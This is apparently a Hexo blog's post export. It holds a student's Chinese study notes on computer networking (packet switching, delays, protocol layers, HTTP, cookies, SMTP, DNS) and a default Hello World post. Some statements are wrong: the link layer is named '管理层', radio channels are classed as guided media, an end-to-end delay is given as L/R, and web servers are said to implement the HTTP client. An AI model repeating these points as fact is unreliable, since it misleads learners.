{"posts":[{"title":"计网学习笔记（1）","text":":::info 前言概要：知识点是根据《计算机网络：自顶向下方法》来整理的，内容以及其顺序可能与其他书本有出入 这篇博客是根据每一节写出我认为可能会考到的点或者说是需要知道的点，所以仅供参考 ::: 计算机网络和因特网几个概念（这一部分浅浅地看看就行） 主机（host）或端系统（end system）：因特网中互联的计算设备 通信链路（communication link）和分组交换机（packet switch）：连接因特网中不同主机或端系统的重要工具。 其中，==链路的传输速率的单位为bit/s或bps== ==分组（packet）==：不同端系统之间在传输信息时，发送端将数据分段并为每段加上首部字节所形成的信息包。 路由器（router）和链路层交换机（link-layer switch）：分组交换机的两种主要类型。 路径（route或path）：在不同端系统之间，一个分组经历的一系列通信链路和分组交换机 ==Internet Server Provider（ISP）==：因特网服务提供商 ==协议（protocol）==：定义了在两个或多个通信实体之间交换的报文的格式和顺序，以及报文发送和/或接收一条报文或其他事件所采取的动作。 因特网中两个重要的协议是TCP/IP协议（Transmission Control Protocol 传输控制协议/Internet Protocol 网际协议），IP协议定义了在路由器和端系统之间发送和接收的分组格式 分布式应用程序(distributed applicalion)：涉及多个相互交换数据的端系统的应用程序 套接字接口（socket interface）：规定一个主机的某个程序请求因特网向另一个主机的特定程序交付数据的方式的接口 网络边缘接入网概念：将端系统物理连接到其边缘路由器的网格。 接入网一般有以下三类，且方式各不相同： 家庭接入：采用数字用户线（DSL）、电缆、光纤到户（FTTP）、拨号、卫星等方式接入； 企业接入：采用以太网和WiFi接入； 广域无线接入：采用第N代无线通信技术（我们常说的4G、5G）和LTE（长期演进）接入 物理媒体可以类比于我们物理所学的介质，一般分为导引型媒体和非导引型媒体。 导引型媒体一般为固体，比较有代表性的媒体有双绞铜线、同轴电缆、光纤、陆地无线电信道、卫星无线电信道等。 非导引型媒体一般为空气或其他抽象物体，比较有代表性的媒体有无线局域网（WLAN）或数字卫星频道等。 网络核心分组交换报文（message）：包含协议设计者所需的一切东西。它可以包含数据，也可以执行一种控制功能。 概念：端系统彼此交换报文。发送端系统将报文分成若干个较小的数据块（就是我们所说的分组），然后每个分组通过通信链路和分组交换机传送。 存储转发传输概念：交换机在能够向输出链路传输某个分组的第一个比特之前，必须要接收整个分组。 就是说，发送端在向接收端传输一个分组时，接收端会将先到达的比特（分组的一部分）储存在缓存区，等到整个分组到达后，接收端才会向出链路传递这个分组 假设传输速率为R bps，两端之间的距离为L，那么接收端接收到整个分组所需的时间为 L/R s 如果接收端是路由器，两端分别是发送端和接收端 发送端想要发送4个分组给接收端 d = 0 s时，发送端开始发送分组； d = L/R s时，路由器完成接收第一个分组，并开始向接收端发送该分组，同时发送端开始发送第二个分组； d = 2L/R s时，接收端完成接收第一个分组，路由器完成接收第二个分组并开始发送该分组，同时发送端开始发送第三个分组； …… 以此类推，当d = 5L/R s时，接收端完成接收所有分组 在这种情况下，端到端的时延为d_端到端 = L/R s 一般在按照上述逻辑的情况下，分组在通过由N条速率均为R的链路组成的路径时，端到端的时延是 ​ d_端到端 = (N * L)/R 排队时延和分组丢失输出缓存（output buffer，也叫输出队列）：用于存储路由器准备发往某条链路的分组； 排队时延（queuing delay）：从进入输出缓存等待到发送的这一段时间。产生的原因是传输的链路正忙于传输其他分组。它的大小取决于网络的拥塞程度； 分组丢失（丢包，pocket loss）：输出缓存已经被正在排队的分组给填满，会出现排队中的分组之一或到达的分组被丢弃的状况 转发表和路由选择协议转发表（forwarding table）：用于将目的地址映射为输出链路。 每个路由器都具有一个转发表，某分组到达某台路由器时，该路由器会检查目的地址，并用这个地址搜索其转发表，用于发现适当的输出链路。 电路交换若交换数据采用这个方式时，当两个端系统进行数据交换的时候，端系统与端系统之间会建立一条端到端的连接。沿着发送方和接收方这条路径上的交换机都将为该连接维护连接状态。 :::info no-icon 只说概念有点抽象，这里举一个经典的例子 传统的电话网络：建立二者之间的连接（占用通信资源）-&gt; 通话（持续占用通信资源） -&gt; 挂断电话，释放连接（归还通信资源） ::: 上述例子表明，端到端之间在传输信息之前会先建立一条连接，然后两端之间路径上的交换机会维持连接状态（占用一定数量的带宽），结束后会将占用带宽归还。 电路交换网络中的复用频分复用（Frequency-Division Multiplexing，FDM）书上说的读不太懂，不知道是不是翻译问题。大概总结一下，就是==用户在分配到一定的频带后，在通信过程中自始至终都占用这个频带==。 （书上说的是：链路的频谱由跨越链路创建的所有连接共享。特别是，在连接期间链路为每条连接专用一个频段） 下图则是FDM的图示，各路信号在同样的时间占用不同的带宽（这里指的是频带宽度而不是不是数据传输速率） 咱之前听收音机或者在坐车时，收听的广播就是用频分复用的方式来给我们传递信息的 时分复用（Time-Devision Multiplexing，TDM）在这条链路中，时间会被等分为一段段TDM帧，每一段帧又会被划分出相同且固定的时隙。当网络跨越一条链路创建一条连接时，网络在每个帧中为该连接指定一个时隙。这些时隙专门由该连接单独使用，一个时隙（在每个帧内）可用于传输该连接的数据。 下图是TDM的图示，序号2则是指定传输数据的专用时隙，周期为一个帧的长度。 在计算TDM传输速率时，若每秒传输2000帧，一个时隙大小是8bit，则传输速率为16kbps :::danger no-icon 分组交换和电路交换的区别 分组交换不会预留端系统之间沿路径通信所需的资源（如缓存，链路传输速率），电路交换会预留； 分组交换无需建立连接，电路交换需要建立连接； 分组交换会将报文分成若干个分组，通信链路只会在传输一个分组时被占用，利用率高； 电路交换会占用通信链路直到整段报文传输结束，利用率低； 分组交换在传输大数据时效率低，且容易丢包； 电路交换可以建立连接，数据传输稳定，效率高，适用于系统间高质量的大数据传输 ::: 网络的网络 这个倒是没啥可说的，直接上图 接入ISP被称为客户； ==IXP（Internet Exchange Point）是因特网交接点==，作用是可以使多个ISP对等，对等的目的是直接将若干个ISP网络连接到一起，这样可以减少对第三方提供商的依赖，减少了数据传输成本 除了第一层，客户与其他ISP可以选择多个ISP连接，这样可以在一个ISP无法正常运作的情况下，客户与其他ISP仍然能正常进行数据交换 分组交换网中的时延、丢包和吞吐量分组交换网中的时延概述==几个重要的时延==：节点处理时延(nodal processing delay)、 排队时延(queuing delay)、传输时延(transmission delay)、传播时延(propagation delay) 这几种时延加起来就是==节点总时延（total nodal delay）== ==一个类比来表明传输时延和传播时延的区别：前者指的是声音从嗓子到嘴巴这一段所需的时间，后者则是从一处传到另一处时，另一处完全接收到声音所需的时间== :::warning 处理时延是以微秒或者更低的数量级作为单位，排队时延是以毫秒或微秒作为单位，传输时延和传播时延是以毫秒为作为单位 因此在计算的时候一定要注意单位，如果题目无说明，那么时延计算出秒时就要警惕起来（umm，总时延除外？） ::: 令dproc、dqueue、dtrans、dprop来表示处理时延、排队时延、传输时延、传播时延，那么节点总时延为： ​ ==dnodal = dproc+dqueue+dtrans+dprop== 排队时延和丢包省流：==设计系统时流量强度不能大于1== 令a表示分组到达队列的平均速率（a的单位是分组/秒，即pkt/s），R是从队列中推出比特的速率（相当于传输速率，以bps为单位），所有分组都是由L bits组成的，队列非常大（能容纳无限数量的bit）则比特到达队列的平均速率是La bps，比率La/R被称为流量强度（traffic intensity）。 当La &gt; R时，比特到达队列的平均速率大于传输速率，如此下去会使排队队列趋近于无穷大，进而导致排队时延无限大 （可以类比于公路上行驶的车辆，若单位时间内进入公路的汽车大于离开公路的汽车，则会导致车辆队列慢慢建立起来，最后导致拥堵） 当0 &lt; La &lt;= R时，平均排队时延和流量强度的关系如下图 由于排队容量有限，所以当排队序列被充满后，路由器会将后面到来的分组丢弃掉，这就是常说的丢包 端到端时延用dend-end表示，则 ​ dend-end = N * (dproc+dtrans+dprop) N是指链路数，那么这一传递过程中有N-1个路由器 这个式子是d端到端 = (N * L)/R的一般形式 计算机网络中的吞吐量这个没啥好说的，理解瞬时吞吐量和平均吞吐量就行 如果数据在传输中会经过不同链路，且不同链路速度不同，则其传输速率按最小的那一个来算（瓶颈链路） 协议层次及其服务模型分层的体系结构协议分层网络设计者以分层的形式组织协议和实现这些协议的网络硬件和软件，即每一层的服务模型 各层的所有协议称为==协议栈==。 因特网的协议栈自顶向下为：==应用层，运输层，网络层，管理层，物理层== ISO OSI参考模型为：==应用层，表示层，会话层，运输层，网络层，管理层，物理层== 应用层应用层是==网络应用程序和它们的应用层协议留存的地方==。 应用层包含了许多协议，如==HTTP（提供Web请求和文档的传送，SMTP（提供电子邮件报文的传送），FTP（提供两个段系统之间的文件传送）== 位于应用层的信息分组称为报文 运输层运输层==在应用程序端点之间传送应用层报文==。 运输层也包含着协议，如TCP和UDP，前者提供面向连接的服务，后者提供无连接服务。我们只要选其中一个就可以运输应用层报文。 位于应用层的信息分组称为报文段 网络层网络层==负责将网络层分组从一台主机移动到另一台主机==。 网络层也包含着协议，如网际协议IP，它定义了在数据报中的各个字段以及端系统和路由器如何作用于这些字段。 位于网络层的信息分组称为数据报 链路（管理）层链路层==用于将分组从一个节点移动到路径上的下一个节点==。 链路层也包含着协议，如DOCSIS，它是关于以太网、WiFi和电缆接入网的协议。不过应用于链路层的协议决定着链路层提供的服务。 位于链路层的信息分组称为帧 物理层物理层==将整个帧的一个个比特从一个节点移动到下一个节点==。 物理层也包含着协议，不过是关于如双绞铜线，同轴电缆等等 :::info 其实，从上述描述中就可以知道为什么是自顶向下的方法了，因为上一层的数据传输总是依赖着它下一层 传输数据的变化：报文 -&gt; 报文段 -&gt; 数据报 -&gt; 帧 -&gt; 比特 ::: 封装[info]{.label .info}这里的说法将情况给简化了点 在发送端，一个应用层报文（M）被传送给运输层，运输层收到报文并附加上运输层的首部信息（H_1），于是乎应用层报文和运输层首部一起构成了运输层报文段。 然后首部将被接收端的运输层使用。运输层向网络层传递该报文段，网络层增加了如源和接收端系统地址等网络层首部信息（H_n），于是乎就生成了网络层数据报。 接着数据报被传递给链路层。链路层增加它自己的链路层首部信息并生成链路层帧。 照这样看来，每一层的一个分组具有两种类型的字段：==首部字段和有效载荷字段==，有效载荷字段一般来源于上一层的分组","link":"/2024/03/10/ComputerInternet/Computer-Internet/"},{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","link":"/2024/07/29/hello-world/"},{"title":"计网学习笔记（2）","text":"应用层应用层协议原理网络应用程序体系架构应用程序体系结构（application architecture）由应用程序研发者设计，规定了如何在各种端系统上组织这个应用程序。 目前的现代网络应用程序中一般会选择两种主流架构：==客户-服务器体系结构和对等（P2P）体系结构== 客户-服务器体系结构服务器是一个==总是处于开机状态==的主机，它服务于来自许多其他称为客户的主机的请求。 特征 两个或多个客户之间是不会直接建立通信的； 服务器具有固定的、周知的地址，即IP地址 应用Web、FTP（文件传输协议）、Telnet（一种远程登录的协议）、电子邮件…… 其他你需要知道的由于使用互联网的人很多，向服务器发送的请求也很多，想要一个服务器来服务所有请求是不现实的。 因此，数据中心的作用就体现出来了，它配备了大量的主机，用于创建一个强大的虚拟服务器。 它的应用想必都见过，例如搜索引擎baidu，谷歌；Internet商务亚马逊，阿里巴巴；社交网络Facebook、推特 P2P体系结构这个结构对位于数据中心的专用服务器具有很少的依赖（有时候可以没有），选用这种结构的应用程序在==间断连接的主机对之间使用直接通信==，这些主机对被称为对等方。 :::info 对等方的一些解释可以参考参考上一章网络的网络部分 ::: 特性 ==自扩展性==。P2P网络是由许多用户节点组成的，当有新的用户加入时，服务的需求虽然在增加，但是系统整体的资源和服务能力也随之扩充，能较大程度上满足用户的需求。在服务器组成的P2P网络中，只需增加服务器就能完成平滑的扩容。 成本低。P2P网络或者应用程序一般是不需要庞大的服务器基础设施和服务器带宽（与客户-服务器相对） 进程通信站在操作系统的角度，进行通信的实际上是进程而并非程序。 在两个不同端系统上的进程，通过跨越计算机网络交换报文来进行通信。 客户和服务器进程网络应用程序==由成对的进程组成，这些进程通过网络相互发送报文==。 在这一对进程中，我们将其中之一标记为客户，另一个则是服务器了。 举个栗子在Web的应用程序中，一个客户浏览器进程与一台服务器进程相互交换报文。此时浏览器就是客户进程，Web服务器就是服务器进程。 在P2P文件共享系统中，文件从一个对等方进程传输到另一个对等方进程。此时下载方被标识为客户，上传方则被标识为服务器。 如何定义客户进程与服务器进程以下定义==基于一对进程之间的通信会话场景==中 客户：发起通话的进程。 服务器：在会话开始时等待联系的进程。 进程与计算机网络之间的接口进程通过一个套接字的软件接口向网络发送报文和从网络接收报文 下图是两个通过因特网通信的进程之间的套接字通信 在这个图中，套接字是同一台主机内应用层与运输层的接口，也是建立网络应用程序的可编程接口，因此也被称为网络应用程序接口（Application Programming Interface，API） 应用程序开发者对套接字的管理从开发者的角度看，他们能够==控制套接字在应用层上的一切==。 对运输层的套接字的控制几乎是手足无措的，仅限于 选择运输层协议 设定几个运输层参数，如最大报文长度 进程寻址一台主机上运行的进程如果想要向另一台主机上运行的进程发送分组，则需要让接收进程有一个地址。 为了让接收进程被标识到，我们需要两种信息： 主机的地址 在目的主机中指定接收进程的标识符 在因特网中，==主机是由IP地址标识的==。 除了IP地址标识外，还需要==发送进程指定运行在接收主机的接收进程==。端口号的作用就在于此。 可供应用程序使用的运输服务在多种多样的运输服务中，我们可以通过四个方面对应用程序服务进行分类：==可靠数据传输，吞吐量，定时，安全性== 可靠数据传输如何判断某个服务能够做一些工作来确保某应用程序的一端发送的数据正确，且能完全地交付给该应用程序的另一端。 其他你可能要知道的 运输层协议能够潜在地向应用程序提供一种重要服务，这种服务是进程到进程的可靠数据传输。发送进程只要将其数据传递进套接字，就可以完全相信该数据能够无差错地到达接收进程。 如果运输层不提供这种服务，那大概率会被依赖这种服务的应用所排斥，但可能会被容忍丢失的应用接受，如一些多媒体应用，它的部分数据丢失一般只会导致卡顿或者音频被干扰等问题，但问题不大 应用电子邮件，文件传输，金融应用等等 吞吐量单位： 比特/秒 =&gt; bit/s 带宽敏感的应用（bandwidth-sensitive application）：对吞吐量有要求的应用程序。 弹性应用（elastic application）：说白了，能够根据带宽状态动态调整吞吐量。 因特网提供的运输服务因特网为应用程序提供了两个运输层协议，分别为==UDP和TCP==。 附：应用程序的服务要求 TCP服务TCP服务的模型包括：==面向连接服务和可靠数据传输服务== 有拥塞控制机制 UDP服务UDP仅提供最小的服务，是无连接的，因此在进行连接的时候没有握手过程，且并不能保证报文能到达接收进程，到了也有可能是乱序的 没有拥塞控制机制（不过有的时候，实际的端到端吞吐量可能小于选定的任意速率，因为中间链路的带宽可能会受限或者拥塞导致的） 因特网不提供的服务运输层协议不提供吞吐量和定时保证的服务 下图是因特网应用所使用的协议 应用层协议定义了运行在不同端系统上的应用程序进程如何相互传递报文。 交换的报文类型，例如请求报文，响应报文 各种类型报文的语法，例如报文中的字段和字段的描述 字段的语义，即这些字段的信息的含义 确定一个进程什么时候，怎么发送报文，对报文响应的规则 这一章涉及到的网络应用Web、文件传输、电子邮件、目录服务、流式视频和P2P Web和HTTPHTTP概况==超文本运输协议（HyperText Transfer Protocol, HTTP）==由客户程序和服务器程序实现，它们通过交换HTTP报文进行会话。同时，HTTP定义了==这些报文的结构以及客户和服务器进行报文交换的方式==。 ==Web页面（Web page，也叫文档）由对象组成==，而对象只是一个文件，例如HTML文件，JPEG图形等等。其中，大多数Web页面都会含有一个HTML文件和几个引用对象，其对象数量就是引用对象的数量加上HTML文件数（说白了就是N+1个对象） ==Web服务器==实现了HTTP的客户端（所以在Web环境中经常会交替使用”浏览器“和”客户“两种术语），也实现了HTTP的服务器端（用于存储Web对象，每个对象由URL寻址） :::info HTML基本文件是通过对象的URL地址来引用页面的其他对象，形如http://www.example.com/path/to/sth都是URL地址，其中www.example.com是主机名，而/path/to/sth是路径名 ::: HTTP定义了Web客户向Web服务器请求Web页面的方式，以及服务器向客户传送Web页面的方式，基本思想如下图： 用户请求一个Web页面； 浏览器向服务器发出该页面中所包含对象的HTTP请求报文； 服务器接收请求并用包含这些对象的HTTP响应报文进行相应 无状态协议HTTP服务器不保存关于用户的任何信息，这里涉及到一个关于HTTP的现象：==服务器向客户发送被请求的文件，但是不存储任何关于用户的状态信息==。 :::info Web使用的是客户-服务器应用程序体系架构，其实看了图示也差不多可以想到了 ::: 非持续链接和持续链接非持续连接（non-persistent connection）==每一个请求/响应对经过一个单独的TCP连接发送==。 假设URL为http://www.example.com/path/to/sth，且其中包含一个HTML文件和N个JPEG图形文件，我们来看看服务端向客户传送一个Web页面的步骤： HTTP客户进程在默认端口号80发起一个到服务器http://www.example.com的TCP连接，在客户与服务器上分别有一个套接字与该连接相关联； HTTP客户经过自己的套接字向服务器发送一个HTTP请求报文，请求报文中包含了路径名/path/to/sth； HTTP服务器进程经过自己的套接字接收该请求报文，从自己的存储器中检索对象http://www.example.com/path/to/sth，并将其封装到一个HTTP响应报文中； HTTP服务器进程通知TCP断开TCP连接。（当然了，要等TCP确认客户已经收到完整的响应报文后，它才会断开连接）； HTTP客户接收响应报文，TCP连接关闭。报文指出封装对象是一个HTML文件，客户从报文提取该文件，检查HTML文件后得到N个JPEG图形文件； 对每一个引用的JPEG图形对象重复前4个步骤。 经过上述步骤，用户在请求该Web页面时，需要产生N+1个TCP连接 :::info 估算从请求到完全接收的时间 往返时间（RTT，Round-Trip Time）：指一个短分组从客户到服务器然后再返回客户所花费的时间 RTT包括分组传播时延、分组在中间路由器和交换机上的排队时延和分组处理时延。 （涉及到三次握手，这个后面再说） 客户请求Web页面时，会先请求建立一个TCP连接。客户向服务器发送一个TCP报文段，服务器再向客户发送一个TCP报文段来作出请求与回应；（占用一个RTT） 客户发送一个HTTP请求报文，报文到达服务器后，服务器就会发送响应报文（占用一个RTT） 后面传输文件的事情就另算了 因此总的时间是2RTT + 传输文件的时间 ::: 持续连接（persistent connection）==所有的请求/响应对经过相同的TCP连接发送==。 相对地，在这个方式下，服务器在发送响应后并不会通知TCP关闭连接，而是保持打开状态，因此后续的请求和响应报文能通过相同的连接进行传送。 说白了，按照上一个连接的例子，需要用到的TCP连接数就会从N+1个变成1个 :::warning no-icon 非持续连接的缺点： 该方式下，两端需要为每一个请求的对象建立和维护一个全新的连接； 时间占用太多，每一个对象需要花费两倍RTT来创建TCP连接和请求接收。 ::: HTTP报文格式请求报文拿书上的例子说说： 第一行为请求行（request line），后面的全部为首部行（header line）。 上图可以看出，请求行有三个部分：方法字段、URL字段和HTTP版本字段。其中，请求方法有很多：==GET、POST、DELETE、PUT、HEAD==。 再来看看首部行： Host：指明对象所在的主机； Connection：close代表非持续连接，open代表持续连接（我记得是open吧）； User-Agent：指明用户代理，也相当于指明发送请求的浏览器的类型； Accept-language：表示用户想得到该对象的语言版本，服务器不存在这样的对象就发送默认语言版本 下图是请求报文的通用格式： 响应报文接着拿书上的例子 响应报文有三个部分：一个初始状态行（status line），若干个首部行（header line），实体体（entity body） 状态行包含三个信息：协议版本字段，状态码，状态信息 首部行： Connection：不赘述； Date：服务器产生并发送报文的时间； Server：表示报文是由某个服务器产生的； Last-Modified：对象创建或者最后修改的日期和时间（这个后面再说）； Content-Length：被发送对象中的字节数（应该是指实体体）； Content-Type：指示实体体中的对象是什么类型的文本 实体体包含了请求的对象本身（data data data……） 状态码有点不想说，我直接把官方的文档放这了 -&gt; click me 用户与服务器的交互：cookiecookie==允许站点对用户进行追踪==。 至于有什么用，举个例子：我访问github.com，但我想访问之后直接到与我有关的界面，这样就可以省去登录步骤，这个时候cookie就发挥了作用，它会保持我在这个网站的登录状态，以防一些不必要的登录。 不过呢，不同的浏览器cookie肯定是不同的，例如火狐登录了csdn，之后就可以省去登录步骤；IE没有登陆过，必须要登录 当然，咱之前玩的小游戏有需要存档的，也用到了cookie 下图表示cookie跟踪用户的状态 根据上图可以得知，cookie技术有四个组件： HTTP响应报文的一个cookie首部行； HTTP请求报文的一个cookie首部行； 用户端系统中保留有一个cookie文件，由用户的浏览器管理； Web站点的一个后端数据库 :::info cookie可以标识一个用户。用户首次访问某个站点时可能需要提供一个用户标识（例如名字），在后面的对话中，浏览器会向服务器传递一个cookie首部，从而向服务器标识了这个用户。 因此，cookie可以在无状态HTTP之上建立一个会话层。 ::: Web缓存Web缓存器（Web cache）也叫代理服务器（proxy server），它是能够代表初始Web服务器来满足HTTP请求的网络空间实体。 其中，Web缓存器有自己的磁盘存储空间，并在存储空间中保存最近请求过的对象的副本。 还是拿书上的例子，看下图： 现在客户配置的浏览器都可以使他们的HTTP请求首先指向Web缓存器，以http://www.example.com/path/to/sth为例，现在浏览器正在请求该对象，来看看都发生了什么： 浏览器创建了一个到Web缓存器的TCP连接，并向Web缓存器中的对象发送一个HTTP请求； Web缓存器接收请求，并检查是否存在该对象的副本。如果有，Web缓存器就返回包含该对象的HTTP响应报文，没有就进行下一步； Web缓存器打开一个与该对象的初始服务器（www.example.com）的TCP连接，然后在这个连接上发送一个关于该对象的HTTP请求。收到请求后，初始服务器向Web缓存器发送包含该对象的HTTP响应； Web缓存器接收到该对象后，它在本地存储空间存储一份副本，并向客户的浏览器发送该副本的HTTP响应报文。 :::danger no-icon 在上述步骤中，Web缓存器既是客户，也是服务器。 ::: 条件GET方法和普通的GET方法有点区别，条件GET方法（conditional GET）在原先GET方法的基础上加了一个功能：==检查该对象是否是最新的== 如果一个请求报文中用到了GET方法，并且该报文的首部行还有包含If-Modified-Since，那么这个HTTP请求报文就是一个条件GET请求报文。 拿书上的例子简单举例，这个倒并不是很重要： 某个代理缓存器代表某个浏览器向某个Web服务器发送了一个请求报文 然后，Web服务器发送了包含该对象的HTTP响应报文 可以看出，缓存器接收了报文，也在本地存储了这个对象，同时也存储了该对象的最后修改日期。 一段时间后，另一个用户向这个缓存器请求同一个对象，由于该对象可能已经被修改，因此在用户请求后，该缓存器会向服务器发送一个条件GET请求来进行检查： 如果该对象没有修改，那么服务器就会向缓存器发送如下响应报文： 报文说明对象没有修改，缓存器可以使用这个对象，最后缓存器把这个对象的副本发送给用户 因特网中的电子邮件这个简单说说就行，感觉不太重要 先上一个因特网电子邮件系统的总体概况图： 可以看到，电子邮件分为三个主要部分：==用户代理（user agent），邮件服务器（mail server），简单邮件传输协议（Simple Mail Transfer Protocol，SMTP）==。 SMTP==SMTP是因特网电子邮件中的主要协议==。它使用TCP可靠数据传输服务，从发送方的邮件服务器向接收方的邮件服务器发送邮件。 跟许多应用层协议一样，SMTP也有两个部分：运行在发送方邮件服务器的客户端，运行在接收方服务器的服务器端。 上一个发送端向接收端发送一个邮件的过程图： Alice调用邮件代理程序并提供Bob的邮件地址，撰写报文后指示代理发送报文； Alice用户代理发送报文到她的邮件服务器，报文被放在报文队列当中； Alice的邮件服务器的SMTP客户端发现了报文队列中的这个报文，于是就创建一个到Bob的邮件服务器的SMTP服务器的TCP连接； 经过初始的SMTP握手之后，SMTP客户通过该TCP连接发送Alice的报文； Bob的邮件服务器上的SMTP的服务器接收该报文，然后该邮件服务器将报文放入Bob的邮箱中； Bob调用用户代理阅读报文 :::info 几个注意的点： SMTP一般不使用中间邮件服务器发送邮件； 接收端的邮件服务器在没有运行的情况下，发送报文会被保留在发送端并等待进行新的尝试，不会在中间的服务器做停留。 ::: 与HTTP的对比相同点 HTTP和SMTP都是用于从一台主机向另一台主机传送文件； 持续的HTTP和SMTP都使用持续连接（感觉像是废话……） 不同点 HTTP用于从Web服务器向Web客户（例如浏览器）传送对象（例如文件），而SMTP用于从一个邮件服务器向另一个邮件服务器传送文件； HTTP主要是一种拉协议（pull protocol），在方便的时候，用户可以使用HTTP从某个Web服务器拉取一些被装载的信息；SMTP主要是一种推协议（push protocol），发送邮件的服务器把文件推向接收邮件的服务器，当二者需要建立TCP连接时，发送邮件的服务器必须为建立连接的发起者。 SMTP要求每个报文采用7比特ASCII码格式，HTTP则不受限制； 在处理包含文本和图形的文档时，HTTP将每个对象封装到对应的不同响应报文中（就是一对一封装），SMTP将所有的对象放在一个报文中。 邮件报文格式不赘述，看看图就行 From和To是必须要有的 后面可能只有一个Subject首部行，也可能有其他多个可选的首部行 邮件访问协议目前流行的邮件访问协议：第三版邮局协议（Post Office Protocol–Version 3，POP3），因特网邮件访问协议（Internet Mail Access Protocol，IMAP），HTTP DNS：因特网的目录服务DNS提供的服务主机识别有两种方式：主机名和IP地址。用户一般偏好主机名，而路由器则偏好IP地址。为了折中两种不同的偏好，域名系统应运而生。 域名系统（Domain Name System，DNS）：==一个由分层的DNS服务器实现的分布式数据库和一个使得主机能够查询分布式数据库的应用层协议。==DNS协议运行在UDP之上，使用53端口 以http://www.example.com/path/to/sth举例，看看用户主机如何获取URL的IP地址： 某台用户主机上运行着DNS应用的客户端； 浏览器从该URL抽出主机名www.example.com，并将其传递给DNS应用的客户端； DNS客户向DNS服务器发送一个包含主机名的请求； DNS客户最终收到一份回答报文，报文包含对应于主机名的IP地址； 浏览器在接收到来自DNS的IP地址后，就向位于该IP地址80端口的HTTP服务器进程发起一个TCP连接 除了进行主机名向IP地址转换外，DNS还提供其他一些重要服务： 主机别名（host aliasing）有的主机名长且复杂，原先的主机名叫规范主机名（canonical hostname）。为了方便记忆，这些主机都会有一个或多个主机别名。应用程序可以调用DNS来获得主机别名、对应的规范主机名和IP地址 邮件服务器别名（mail server aliasing）跟主机别名差不多，不赘述。 负载分配（load distribution）此时的DNS用于冗余的服务器之间的负载分配。某个繁忙的站点被分布在多台服务器上，每台服务器运行在不同的端系统上，每个端系统都有不同的IP地址。这些冗余的服务器让一个IP地址集合与同一个规范主机名相联系，同时DNS数据库存储着这些IP地址的集合，因此当客户对映射到某地址集合的名字发出DNS请求，该服务器就用IP地址的整个集合进行响应，不过不同IP之间在响应时是有顺序的。 DNS工作机理概述这里就简单点说： 用户主机的某应用程序需要将主机名转换为IP地址，调用DNS客户端，并指明需要被转换的主机名； 用户主机的DNS接收后向网络发送一个DNS查询报文； 经过一段时延后，用户主机上的DNS接收到一个提供希望映射的DNS回答报文； 映射结果传递到调用DNS的应用程序 :::warning 所有的DNS请求和回答报文使用UDP数据报经过端口53发送 ::: DNS的分布式设计单一的DNS服务器虽然简单，但是出现的问题很多，包括但不限于： 单点故障（a single point of failure）：如果这个DNS服务器崩溃，那么整个因特网就会崩溃； 通信容量（traffic volumn）：单个DNS服务器处理上亿个DNS查询显然不够； 远距离的集中式数据库（distant centralized database）：单个DNS服务器是不可能位于所有用户的附近，若距离较远的用户向DNS服务器发送请求，那么可能会因为拥塞和低速的链路而导致很大的时延； 维护（maintenance）：单个DNS服务必须要保留所有的因特网主机的记录，不仅会使数据库庞大，还需要为新主机的加入频繁更新。 因此，DNS的分布式设计应运而生。 分布式、层次数据库为了解决扩展性问题，DNS使用了大量的DNS服务器，以层次方式组织，并且分布在全世界范围内。 这种方式一般有3种DNS服务器：==根DNS服务器，顶级域（Top-Level Domain，TLD）DNS服务器，权威DNS服务器。== 下图为部分DNS服务器的层次结构： 除了以上服务器之外，还有一类重要的DNS服务器称为本地DNS服务器（local DNS server），虽然它不属于层次结构里面的任何服务器，但是对层次结构十分重要。 一台主机如何得知另一台主机的IP地址呢？ 举个例子：（请求主机设为A，目标主机设为B） 主机A向它的本地DNS服务器发送一个DNS查询报文，报文包含了被转换的主机名B； 本地DNS服务器将报文转发给根DNS服务器； 根DNS服务器注意到主机A的edu前缀，然后向本地DNS服务器返回负责edu的TLD的IP地址列表； 本地DNS服务器再次向指定的TLD服务器之一发送报文； TLD服务器注意到umass.edu的前缀，用权威DNS服务器的IP地址进行响应； 本地DNS服务器向权威DNS服务器重新发送报文； 权威DNS服务器用主机B的IP地址进行响应； 本地DNS服务器返回给主机A。 这个步骤中总共发送了8篇报文。 :::info 上述例子利用了递归查询（recursive query）和迭代查询（iterative query）。 从主机到本地DNS服务器是递归查询，其余的均为迭代查询，因为所有的响应都是返回给本地DNS服务器的。 递归查询的例子如下图： 这是不是就相当于之前学的递归呢，例如斐波那契额数列，调用函数本身，最终的结果是函数本身返回的值。 ::: DNS缓存相当于在本地DNS服务器添加了一个DNS缓存器，用于存储每一个接收到的回答，可以绕过根服务器，便于请求主机在请求相同的地址时可以直接返回该IP地址，节省了时间，也节省了资源。 DNS记录和报文资源记录（Resource Record，RR）资源记录提供了主机名到IP地址的映射。每一个DNS回答报文包含了一条或多条资源记录。 资源记录包含了以下四元组：==（Name，Value，Type，TTL）== TTL是记录的生存时间，它决定了资源记录应当从缓存中删除的时间。Name和Value取决于Type： Type=A，则Name就是主机名，Value就是主机名对应的IP地址； Type=NS，则Name就是域名（如example.com），Value就是权威DNS服务器的主机名（如dns.example.com）； Type=CNAME，则Name就是域名，Value是与之对应的规范主机名； Type=MX，则Name就是域名，Value是与之对应的邮件服务器的规范主机名 DNS报文以下是DNS报文格式： 先说说前12个字节首部区域： 标识符是16比特的数，用于标识该查询。该标识符会被复制到对应的回答报文中，以便匹配发送的请求和收到的回答； 标志字段有若干个标志，1比特的”查询/回答“标志位指出报文是查询（0）还是回答（1）；当请求的是权威DNS服务器时，1比特的”权威“标志位会置于回答报文中； 如果客户在DNS服务器没有某记录时想要递归查询，那么报文就会设置1比特的“希望标志”位； 如果DNS服务器支持递归查询，那么回答报文中把1比特的“递归可用”标志位进行置位； 另外四个有关数量的字段，则指出了在首部后的4类数据区域出现的数量 再说说后面的数据区域： 问题区域包含正在进行的查询信息，包括：（1）名字字段，包含正在被查询的主机名；（2）类型字段，指出有关该名字的正被询问的问题类型，例如是否与一个名字（A）或一个名字的邮件服务器（MX）相关联； 回答区域包含了对最初请求的名字的资源记录（上面已经说过，不记得的可以去翻翻看）。在回答报文中的回答区域中可以包含多条RR，因此一个主机名能够有多个IP地址； 权威区域包含了其他权威服务器的记录； 